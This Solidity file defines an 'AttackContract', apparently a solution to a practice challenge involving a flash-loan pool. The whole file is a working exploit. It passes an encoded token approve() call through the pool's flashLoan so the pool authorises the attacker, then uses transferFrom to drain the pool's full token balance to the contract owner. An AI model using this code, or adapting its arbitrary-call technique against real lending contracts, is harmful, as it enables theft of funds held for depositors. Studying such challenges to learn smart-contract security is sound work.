// SPDX-License-Identifier: MIT

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

pragma solidity ^0.8.0;

interface ITrusterLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract AttackContract is Ownable {

    constructor () {}

    function attack(IERC20 token, ITrusterLenderPool pool) public onlyOwner {

        uint256 poolBalance = token.balanceOf(address(pool));

        bytes memory approvePayload = abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance);

        // approve poolBalance amount of token for this address
        pool.flashLoan(0, msg.sender, address(token), approvePayload);

        // upon approval, transfer full poolBalance amount to owner
        token.transferFrom(address(pool), msg.sender, poolBalance);
    }

}